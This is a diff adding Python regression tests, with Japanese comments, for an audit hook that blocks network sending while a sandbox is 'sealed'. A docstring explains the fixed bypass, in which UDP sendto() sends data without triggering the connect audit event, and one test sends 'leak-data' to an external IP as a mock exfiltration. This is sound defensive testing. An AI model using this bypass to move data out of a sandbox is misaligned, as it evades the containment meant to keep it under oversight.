@@ -150,6 +150,53 @@ def test_unsealed_state_allows_normal_operation():
     assert out.decode().strip() == "ok"
 
 
+def test_udp_sendto_is_blocked_while_sealed():
+    """
+    [脆弱性修正の回帰テスト・核心 §CA] 以前は`forbidden`集合に
+    "socket.connect"のみが含まれ、"socket.sendto"は含まれていなかった。
+    UDPの`socket.sendto()`は事前の`connect()`を一切必要とせずデータを
+    送信できるため、"socket.connect"というaudit eventを一度も発火させず、
+    封鎖中(深層保護が有効な状態)でもデータ送信(外部への情報持ち出し)が
+    例外無しで素通りしてしまっていた。実機で確認済み: 修正前は本テストと
+    同じ操作が例外無しに成功していた。
+    """
+    import socket
+
+    mg._register_audit_hook_once()
+    mg.set_sanctuary_sealed(True)
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        try:
+            s.sendto(b"leak-data", ("93.184.216.34", 12345))
+            assert False, (
+                "修正前の欠陥が再発している: 封鎖中にsocket.sendto()による"
+                "データ送信が深層保護をすり抜けて実行されてしまった。"
+            )
+        except mg.LossOfAtaraxia:
+            pass
+    finally:
+        mg.set_sanctuary_sealed(False)
+        s.close()
+
+
+def test_udp_sendto_is_allowed_when_unsealed():
+    """[誤検知防止] 封鎖していない通常時は、socket.sendto()も(この監査
+    フックによっては)遮断されない。"""
+    import socket
+
+    mg._register_audit_hook_once()
+    assert mg.is_sanctuary_sealed() is False
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.sendto(b"hello", ("127.0.0.1", 1))
+    except OSError:
+        # ネットワーク到達性の問題でOSErrorになること自体は許容する
+        # (本テストが確認したいのはLossOfAtaraxiaが発生しないことのみ)。
+        pass
+    finally:
+        s.close()
+
+
 def test_get_machine_id_is_not_a_constant_placeholder_on_linux():
     """[脆弱性修正の核心] GRIMOIRE.md §AS参照。以前の実装はWindows以外の
     プラットフォーム(本サンドボックスのLinuxを含む)では、ホストの識別
